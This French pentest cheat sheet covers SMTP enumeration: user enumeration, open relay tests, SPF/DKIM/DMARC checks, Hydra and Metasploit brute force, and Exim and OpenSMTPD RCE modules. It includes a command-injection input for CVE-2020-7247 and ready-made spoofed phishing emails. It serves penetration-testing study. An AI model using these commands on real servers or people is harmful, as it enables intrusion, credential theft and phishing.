# SMTP Enumeration

SMTP (Simple Mail Transfer Protocol) est le protocole standard d'envoi de courriers électroniques opérant sur les ports 25, 465 et 587. En pentest, SMTP est une cible intéressante pour l'énumération d'utilisateurs valides, le relayage non autorisé (open relay), le spoofing d'emails et l'exploitation de versions vulnérables.

## Objectifs

- Identifier la version du serveur SMTP
- Enumérer les utilisateurs valides (VRFY, EXPN, RCPT TO)
- Tester le relayage ouvert (open relay)
- Identifier les mauvaises configurations SPF / DKIM / DMARC
- Tester les credentials
- Exploiter des versions vulnérables

## Ports

| Port | Service | Description |
|---|---|---|
| 25 | SMTP | Envoi serveur à serveur |
| 465 | SMTPS | SMTP sur SSL |
| 587 | SMTP Submission | Envoi client vers serveur |
| 2525 | SMTP | Port alternatif |

## Quick Enumeration

::: code-group
```bash [Nmap]
nmap -p25,465,587 --script smtp-enum-users,smtp-open-relay,smtp-commands <target>
```
```bash [NetExec]
nxc smtp <target> -u users.txt --no-bruteforce
```
```bash [smtp-user-enum]
smtp-user-enum -M VRFY -U users.txt -t <target>
```
```bash [Telnet]
telnet <target> 25
```

:::

## Workflow Pentest
```
1. Scan des ports 25 / 465 / 587
2. Banner grabbing — identification du serveur
3. Enumération des commandes SMTP disponibles
4. Enumération des utilisateurs (VRFY / EXPN / RCPT TO)
5. Test du relayage ouvert (open relay)
6. Vérification SPF / DKIM / DMARC
7. Bruteforce des credentials
8. Exploitation de version vulnérable
9. Spoofing d'email si open relay
```

## Nmap

### Scan basique
```bash
nmap -p25,465,587 <target>
```

### Détection version
```bash
nmap -p25 -sV <target>
```

### Scripts NSE
```bash
# Commandes SMTP disponibles
nmap -p25 --script smtp-commands <target>

# Enumération utilisateurs
nmap -p25 --script smtp-enum-users <target>
nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <target>

# Open relay
nmap -p25 --script smtp-open-relay <target>

# Vulnérabilités
nmap -p25 --script smtp-vuln-cve2010-4344 <target>
nmap -p25 --script smtp-vuln-cve2011-1720 <target>
nmap -p25 --script smtp-vuln-cve2011-1764 <target>

# Full enum
nmap -p25 --script smtp-* <target>
```

## Enumeration

### Banner grabbing

::: code-group
```bash [Netcat]
nc -nv <target> 25
```
```bash [Telnet]
telnet <target> 25
```
```bash [curl]
curl -v smtp://<target>
```
```bash [OpenSSL — SMTPS]
openssl s_client -connect <target>:465
openssl s_client -starttls smtp -connect <target>:587
```

:::

### Commandes SMTP de base
```
# Connexion
EHLO attacker.com          → Salutation étendue (liste les extensions)
HELO attacker.com          → Salutation basique

# Enumération utilisateurs
VRFY user@domain.com       → Vérifier si l'utilisateur existe
EXPN mailinglist           → Développer une liste de diffusion
RCPT TO:<user@domain.com>  → Tester si l'adresse est valide

# Envoi d'email
MAIL FROM:<sender@domain.com>
RCPT TO:<recipient@domain.com>
DATA
Subject: Test
Body content
.                          → Terminer le message

# Fin de session
QUIT
RSET                       → Réinitialiser la session
```

### Enumération manuelle via Telnet
```bash
# Connexion
telnet <target> 25

# Salutation
EHLO attacker.com

# VRFY — vérifier un utilisateur
VRFY root
VRFY admin
VRFY user@domain.com

# EXPN — développer une liste
EXPN admins
EXPN all

# RCPT TO — tester une adresse
MAIL FROM:<test@test.com>
RCPT TO:<root@domain.com>
RCPT TO:<admin@domain.com>
```

### Réponses SMTP — codes courants

| Code | Signification |
|---|---|
| 220 | Service prêt |
| 250 | OK — utilisateur existe |
| 251 | Utilisateur non local — transféré |
| 252 | Impossible de vérifier — accepté quand même |
| 354 | Commencer la saisie du message |
| 421 | Service non disponible |
| 450 | Boîte mail non disponible |
| 500 | Erreur de syntaxe |
| 550 | Utilisateur inexistant |
| 551 | Utilisateur non local |
| 552 | Quota dépassé |

### smtp-user-enum
```bash
# Méthode VRFY
smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -t <target>

# Méthode EXPN
smtp-user-enum -M EXPN -U users.txt -t <target>

# Méthode RCPT
smtp-user-enum -M RCPT -U users.txt -t <target> -D domain.com

# Toutes les méthodes
smtp-user-enum -M VRFY -U users.txt -t <target>
smtp-user-enum -M EXPN -U users.txt -t <target>
smtp-user-enum -M RCPT -U users.txt -t <target> -D domain.com

# Port personnalisé
smtp-user-enum -M VRFY -U users.txt -t <target> -p 587
```

### Via Metasploit
```bash
# Enumération utilisateurs
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target>
set USER_FILE users.txt
run

# Version
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <target>
run
```

## Open Relay

Un open relay permet d'envoyer des emails en se faisant passer pour n'importe qui — vecteur de spam et de phishing.

### Tester manuellement
```bash
telnet <target> 25

EHLO attacker.com
MAIL FROM:<fake@external.com>
RCPT TO:<victim@external.com>
DATA
Subject: Open Relay Test
This is a test.
.
QUIT
```

### Via Nmap
```bash
nmap -p25 --script smtp-open-relay --script-args \
  smtp-open-relay.from=test@test.com,smtp-open-relay.to=victim@victim.com <target>
```

### Via Metasploit
```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS <target>
set MAILFROM attacker@attacker.com
set MAILTO victim@victim.com
run
```

## SPF / DKIM / DMARC

Vérifier la configuration anti-spoofing du domaine cible.
```bash
# SPF
dig TXT <domain> | grep spf
nslookup -type=TXT <domain> | grep spf

# DKIM
dig TXT default._domainkey.<domain>
dig TXT mail._domainkey.<domain>

# DMARC
dig TXT _dmarc.<domain>
nslookup -type=TXT _dmarc.<domain>

# Via CLI — MXToolbox style
host -t TXT <domain>
```

### Interprétation SPF
```
v=spf1 include:_spf.google.com ~all

~all → Softfail — emails non autorisés marqués comme spam
-all → Hardfail — emails non autorisés rejetés
+all → Accepte tout (dangereux — open relay SPF)
?all → Neutre
```

## Credentials Attacks

### Bruteforce Hydra
```bash
# SMTP basique
hydra -l user@domain.com -P /usr/share/wordlists/rockyou.txt smtp://<target>

# SMTP avec TLS
hydra -l user@domain.com -P passwords.txt smtp://<target> -S

# Port 587
hydra -l user@domain.com -P passwords.txt smtp://<target> -s 587
```

### Bruteforce Metasploit
```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

### NetExec
```bash
nxc smtp <target> -u user@domain.com -p password
nxc smtp <target> -u users.txt -p passwords.txt
```

## Exploitation

### Vulnérabilités courantes

| CVE | Serveur | Description |
|---|---|---|
| CVE-2010-4344 | Exim | Heap overflow — RCE |
| CVE-2011-1720 | Postfix | Mémoire — DoS |
| CVE-2011-1764 | Exim DKIM | Format string — RCE |
| CVE-2019-10149 | Exim | RCE non authentifié |
| CVE-2020-7247 | OpenSMTPD | RCE non authentifié |
| CVE-2021-27135 | Exim | Heap overflow |

### Exim — CVE-2019-10149
```bash
# Vérification
nmap -p25 -sV <target>

# Exploitation via Metasploit
use exploit/unix/smtp/exim4_string_format
set RHOSTS <target>
run
```

### OpenSMTPD — CVE-2020-7247
```bash
# Exploitation manuelle
telnet <target> 25
EHLO attacker.com
MAIL FROM:<;sleep 10;>
RCPT TO:<root>
DATA
.
QUIT

# Via Metasploit
use exploit/unix/smtp/opensmtpd_mail_from_rce
set RHOSTS <target>
run
```

### Recherche d'exploits
```bash
searchsploit smtp
searchsploit exim
searchsploit postfix
searchsploit sendmail
```

## Email Spoofing

Si l'open relay ou l'absence de SPF / DMARC le permet :
```bash
# Via sendmail
sendmail -f fake@trusted.com victim@company.com << EOF
Subject: Important Security Notice
From: IT Department <it@company.com>
To: victim@company.com

Votre compte nécessite une vérification immédiate.
EOF

# Via swaks
swaks --to victim@company.com \
      --from ceo@company.com \
      --server <target> \
      --header "Subject: Urgent" \
      --body "Cliquez ici : http://<ATK>/phishing"

# Via Python
python3 -c "
import smtplib
from email.mime.text import MIMEText
msg = MIMEText('Corps du message')
msg['Subject'] = 'Test spoofing'
msg['From'] = 'fake@trusted.com'
msg['To'] = 'victim@company.com'
s = smtplib.SMTP('<target>', 25)
s.sendmail('fake@trusted.com', ['victim@company.com'], msg.as_string())
s.quit()
"
```

## Anonymous Access
```bash
# Test connexion sans authentification
telnet <target> 25
EHLO test.com
VRFY root
VRFY admin

# Test envoi sans auth (open relay)
MAIL FROM:<test@test.com>
RCPT TO:<victim@external.com>
DATA
Test.
.
```

## Points d'attaque

- Open relay envoi d'emails sans authentification
- VRFY / EXPN activés énumération d'utilisateurs
- Absence de SPF / DKIM / DMARC spoofing possible
- Version vulnérable (Exim, OpenSMTPD, Postfix)
- Credentials faibles sur l'authentification SMTP
- STARTTLS non forcé trafic en clair interceptable
- Banner qui révèle la version du serveur

::: info Tips 

- `smtp-user-enum` avec la méthode RCPT est souvent la plus fiable — VRFY est désactivé sur beaucoup de serveurs modernes
- Un open relay combiné à l'absence de DMARC permet du phishing très convaincant depuis le domaine de la cible
- Vérifier systématiquement SPF, DKIM et DMARC avant de tenter du spoofing
- `swaks` est l'outil le plus polyvalent pour tester manuellement un serveur SMTP
- Les serveurs Exim sont fréquents sur les hébergements mutualisés — souvent non patchés
- Le port 587 avec STARTTLS est de plus en plus utilisé à la place du port 25 — ne pas l'oublier
- Corréler les utilisateurs trouvés via SMTP avec d'autres vecteurs (LDAP, RPC, Kerberos)

:::

::: details Checklist

- Ports 25 / 465 / 587 ouverts identifiés
- Version du serveur SMTP détectée
- Commandes SMTP disponibles énumérées
- VRFY / EXPN / RCPT testés
- Utilisateurs valides identifiés
- Open relay testé
- SPF / DKIM / DMARC vérifiés
- Bruteforce credentials effectué
- Version vulnérable exploitée
- Email spoofing tenté si open relay

:::

## Notes
```
 # Notes terrain
```


## Tools

- [Nmap](https://nmap.org/)
- [smtp-user-enum](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)
- [swaks](https://jetmore.org/john/code/swaks/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Metasploit](https://www.metasploit.com/)
- [sendemail](https://github.com/mogaal/sendemail)

## Ressources

- [HackTricks SMTP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
- [PayloadsAllTheThings SMTP](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Nmap SMTP Scripts](https://nmap.org/nsedoc/categories/smtp.html)
- [CVE-2019-10149 Exim](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)
- [CVE-2020-7247 OpenSMTPD](https://nvd.nist.gov/vuln/detail/CVE-2020-7247)



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/enumeration/smtp.md)</span>

</div>